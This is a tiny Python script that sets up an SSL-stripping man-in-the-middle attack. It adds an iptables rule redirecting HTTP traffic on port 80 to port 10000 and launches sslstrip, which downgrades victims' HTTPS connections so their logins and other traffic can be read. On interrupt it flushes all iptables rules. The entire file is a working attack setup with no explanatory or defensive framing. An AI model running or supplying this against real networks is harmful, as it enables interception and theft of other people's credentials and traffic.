import os

try:
	os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
	os.system("sudo sslstrip")
except KeyboardInterrupt:
	os.system("sudo iptables --flush")
	
